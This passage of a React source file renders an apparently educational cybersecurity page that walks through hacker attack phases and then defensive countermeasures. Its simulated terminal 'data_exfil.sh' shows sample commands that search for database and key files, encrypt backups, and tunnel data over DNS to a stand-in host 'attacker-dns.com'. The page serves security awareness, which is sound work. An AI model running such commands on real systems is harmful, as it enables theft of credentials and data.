                    icon: Database,
                    title: "Data Discovery",
                    desc: "Searching for databases, configuration files with credentials, and sensitive documents (PDFs, spreadsheets)."
                  },
                  {
                    icon: Download,
                    title: "Exfiltration",
                    desc: "Transferring data to an external server controlled by the attacker, often using encrypted tunnels to hide the traffic."
                  },
                  {
                    icon: Lock,
                    title: "Encryption (Ransomware)",
                    desc: "In some cases, the attacker encrypts the data on-site and demands a ransom for the decryption key."
                  }
                ].map((item, i) => (
                  <div key={i} className="flex gap-4 group">
                    <div className="w-10 h-10 rounded bg-cyber-green/10 flex items-center justify-center shrink-0 text-cyber-green border border-cyber-green/20 group-hover:bg-cyber-green/20 transition-colors">
                      <item.icon size={20} />
                    </div>
                    <div>
                      <h4 className="font-bold mb-1 group-hover:text-cyber-green transition-colors">{item.title}</h4>
                      <p className="text-sm text-gray-500">{item.desc}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
            
            <div className="relative">
              <div className="absolute -inset-4 bg-cyber-green/10 blur-3xl rounded-full" />
              <TerminalWindow 
                title="data_exfil.sh"
                lines={[
                  "# 1. Search for sensitive files",
                  "> find / -name \"*.sql\" -o -name \"*.p12\" 2>/dev/null",
                  "/var/backups/prod_db.sql",
                  "/etc/ssl/private/server.p12",
                  "",
                  "# 2. Compress and encrypt data",
                  "> tar -czf - /var/backups/ | openssl enc -aes-256-cbc -e > data.tar.gz.enc",
                  "",
                  "# 3. Exfiltrate via DNS tunneling",
                  "> ./iodine -f -P secret attacker-dns.com",
                  "Tunnel established. Sending data..."
                ]}
              />
            </div>
          </div>
        </div>
      </Section>

      {/* Phase 6: Covering Tracks */}
      <Section>
        <div className="max-w-5xl mx-auto">
          <div className="grid md:grid-cols-2 gap-16 items-center">
            <div className="order-2 md:order-1">
              <CoveringTracksSimulator />
            </div>
            <div className="order-1 md:order-2">
              <h2 className="text-4xl font-bold mb-6">
                Phase 6: <span className="text-cyber-red">Covering Tracks</span>
              </h2>
              <p className="text-gray-400 text-lg mb-8 leading-relaxed">
                The final act. To avoid detection and forensic analysis, the attacker must erase all evidence of their presence on the system.
              </p>
              
              <div className="space-y-6">
                {[
                  {
                    icon: Eraser,
                    title: "Log Deletion",
                    desc: "Removing entries from system logs (syslog, auth.log, access.log) that record the attacker's IP and actions."
                  },
                  {
                    icon: Ghost,
                    title: "Ghosting",
                    desc: "Deleting temporary files, exploit payloads, and any tools uploaded during the attack."
                  },
                  {
                    icon: Activity,
                    title: "History Clearing",
                    desc: "Wiping the shell command history and resetting file timestamps to hide modifications."
                  }
                ].map((item, i) => (
                  <div key={i} className="flex gap-4 group">
                    <div className="w-10 h-10 rounded bg-cyber-red/10 flex items-center justify-center shrink-0 text-cyber-red border border-cyber-red/20 group-hover:bg-cyber-red/20 transition-colors">
                      <item.icon size={20} />
                    </div>
                    <div>
                      <h4 className="font-bold mb-1 group-hover:text-cyber-red transition-colors">{item.title}</h4>
                      <p className="text-sm text-gray-500">{item.desc}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </Section>

      {/* Countermeasures Section */}
      <Section className="bg-cyber-green/5">
        <div className="max-w-5xl mx-auto">
          <div className="flex flex-col items-center text-center mb-16">
            <div className="p-4 rounded-full bg-cyber-green/20 text-cyber-green mb-6">
              <Shield size={48} />
            </div>
            <h2 className="text-5xl font-black mb-4">THE COUNTERMEASURES</h2>
            <p className="text-gray-400 max-w-2xl">
              Defense in depth is the only way to survive. You must secure every 
              layer of your stack.
            </p>
          </div>

          <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
            {[
              {
                icon: Shield,
                title: "Web Application Firewall",
                desc: "Filter and monitor HTTP traffic between a web application and the Internet. Blocks SQLi and XSS automatically.",
                img: "https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&q=80&w=1200",
                tools: ["Cloudflare", "AWS WAF", "ModSecurity", "Akamai"]
              },
              {
                icon: Key,
                title: "MFA & Strong Auth",
                desc: "Multi-Factor Authentication makes brute force attacks nearly impossible, even if a password is stolen.",
                img: "https://images.unsplash.com/photo-1614064641938-3bbee52942c7?auto=format&fit=crop&q=80&w=1200",
                tools: ["Duo Security", "Okta", "Google Authenticator", "YubiKey"]
              },
              {
                icon: Cpu,
                title: "Patch Management",
                desc: "Regularly update your OS, web server (Nginx/Apache), and CMS to fix known security vulnerabilities.",
                img: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&q=80&w=1200",
                tools: ["WSUS", "Ansible", "Chef", "Puppet"]
              },
              {
                icon: Lock,
                title: "HTTPS/TLS Encryption",
                desc: "Encrypt data in transit to prevent Man-in-the-Middle attacks and packet sniffing.",
                img: "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=1200",
                tools: ["Let's Encrypt", "DigiCert", "OpenSSL", "Certbot"]
              },
              {
                icon: Eye,
                title: "Intrusion Detection",
                desc: "Use IDS/IPS systems (like Snort or Suricata) to detect and block suspicious network patterns in real-time.",
                img: "https://images.unsplash.com/photo-1551808195-32694775303c?auto=format&fit=crop&q=80&w=1200",
                tools: ["Snort", "Suricata", "OSSEC", "Wazuh"]
              },
              {
                icon: CheckCircle2,
                title: "Input Validation",
                desc: "Sanitize all user inputs on the server-side. Never trust data coming from the client browser.",
                img: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&q=80&w=1200",
                tools: ["OWASP ESAPI", "Validator.js", "DOMPurify", "Zod"]
              }
            ].map((item, i) => (
              <Card 
                key={i}
                icon={item.icon}
                title={item.title}
                description={item.desc}
                tools={item.tools}
                colorClass="text-cyber-green"
                onClick={() => setSelectedCountermeasure({
                  title: item.title,
                  img: item.img,
                  desc: item.desc,
                  tools: item.tools
                })}
              />
            ))}
          </div>
        </div>
      </Section>

      {/* Conclusion / CTA */}
      <Section className="text-center items-center">
        <div className="max-w-3xl">
          <h2 className="text-5xl font-bold mb-8">Stay Vigilant. Stay Secure.</h2>
          <p className="text-xl text-gray-400 mb-12">
            Security is not a product, it's a process. By understanding the 
            hacker's methodology, you can stay one step ahead and protect 
            your users' data.
          </p>
          <div className="flex flex-wrap justify-center gap-6">
            <button className="px-8 py-4 bg-cyber-green text-black font-bold rounded-lg hover:bg-cyber-green/80 transition-colors flex items-center gap-2">
              <Shield size={20} />
              Download Security Checklist
            </button>
            <button className="px-8 py-4 bg-white/5 border border-white/10 text-white font-bold rounded-lg hover:bg-white/10 transition-colors">
              View Documentation
            </button>
          </div>
          
          <div className="mt-24 pt-12 border-t border-white/5 grid grid-cols-3 gap-8">
            <div>
              <div className="text-3xl font-bold text-cyber-green mb-1">99.9%</div>
              <div className="text-xs text-gray-500 uppercase tracking-widest">Uptime Target</div>
            </div>
            <div>
              <div className="text-3xl font-bold text-cyber-blue mb-1">24/7</div>
              <div className="text-xs text-gray-500 uppercase tracking-widest">Monitoring</div>
            </div>
            <div>
              <div className="text-3xl font-bold text-cyber-red mb-1">0</div>
              <div className="text-xs text-gray-500 uppercase tracking-widest">Trust Policy</div>
            </div>
          </div>
        </div>
      </Section>

      {/* Footer */}
      <footer className="py-12 border-t border-white/5 text-center text-gray-600 text-sm">
        <div className="flex justify-center gap-6 mb-4">
          <Globe size={18} className="hover:text-cyber-green cursor-pointer" />
          <Terminal size={18} className="hover:text-cyber-green cursor-pointer" />
          <Lock size={18} className="hover:text-cyber-green cursor-pointer" />
        </div>
        <p>&copy; 2026 CyberShield Systems. All rights reserved.</p>
        <p className="mt-2 font-mono text-[10px] opacity-30">SECURE_PROTOCOL_V4.2_INITIATED</p>
      </footer>

      {/* Recon Modal */}
      {selectedRecon && (
        <div 
          onClick={() => {
            console.log("Closing modal (simple)");
            setSelectedRecon(null);
          }}
          className="fixed inset-0 z-[9999] flex items-center justify-center p-6 bg-black/90 backdrop-blur-md cursor-pointer"
        >
          <motion.div 
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            onClick={(e) => e.stopPropagation()}
            className="max-w-4xl w-full bg-cyber-bg border border-white/10 rounded-2xl overflow-hidden shadow-2xl cursor-default"
          >
            <div className="relative aspect-video bg-black">
              <StaticImage 
                src={selectedRecon.img} 
                title={selectedRecon.title} 
              />
              <div className="absolute inset-0 bg-gradient-to-t from-cyber-bg via-transparent to-transparent" />
              <button 
                onClick={() => setSelectedRecon(null)}
                className="absolute top-4 right-4 p-2 rounded-full bg-black/50 text-white hover:bg-cyber-red transition-colors"
              >
                <Zap size={20} className="rotate-45" />
              </button>
            </div>
            <div className="p-8">
              <h3 className="text-3xl font-bold mb-4 text-cyber-green font-display">{selectedRecon.title}</h3>
              <p className="text-gray-400 leading-relaxed mb-6">{selectedRecon.desc}</p>
              <div className="flex items-center gap-2 text-xs font-mono text-cyber-green/50 uppercase tracking-widest">
                <Activity size={14} />
                Intelligence Source: Verified
              </div>
            </div>
          </motion.div>
        </div>
      )}
      {/* Countermeasure Modal */}
      {selectedCountermeasure && (
        <div 
          onClick={() => setSelectedCountermeasure(null)}
          className="fixed inset-0 z-[9999] flex items-center justify-center p-6 bg-black/90 backdrop-blur-md cursor-pointer"
        >
          <motion.div 
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            onClick={(e) => e.stopPropagation()}
            className="max-w-4xl w-full bg-cyber-bg border border-cyber-green/20 rounded-2xl overflow-hidden shadow-2xl cursor-default"
          >
            <div className="relative aspect-video bg-black">
              <StaticImage 
                src={selectedCountermeasure.img} 
                title={selectedCountermeasure.title} 
              />
              <div className="absolute inset-0 bg-gradient-to-t from-cyber-bg via-transparent to-transparent" />
              <button 
                onClick={() => setSelectedCountermeasure(null)}
                className="absolute top-4 right-4 p-2 rounded-full bg-black/50 text-white hover:bg-cyber-green transition-colors"
              >
                <Zap size={20} className="rotate-45" />
              </button>
            </div>
            <div className="p-8">
              <div className="flex items-center gap-3 mb-4">
                <Shield className="text-cyber-green" size={24} />
                <h3 className="text-3xl font-bold text-cyber-green font-display">{selectedCountermeasure.title}</h3>
              </div>
              <p className="text-gray-400 leading-relaxed mb-8">{selectedCountermeasure.desc}</p>
              
              {selectedCountermeasure.tools && (
                <div className="mb-8">
                  <div className="text-xs font-mono text-gray-500 uppercase tracking-widest mb-3">Enterprise Solutions</div>
                  <div className="flex flex-wrap gap-3">
                    {selectedCountermeasure.tools.map(tool => (
                      <span key={tool} className="px-3 py-1.5 rounded bg-cyber-green/5 text-cyber-green text-xs font-mono border border-cyber-green/20">
                        {tool}
                      </span>
                    ))}
                  </div>
                </div>
              )}

              <div className="flex items-center gap-2 text-xs font-mono text-cyber-green/50 uppercase tracking-widest">
                <Activity size={14} />
                Defense Status: Operational
              </div>
            </div>
          </motion.div>
        </div>
      )}
    </div>
  );
}
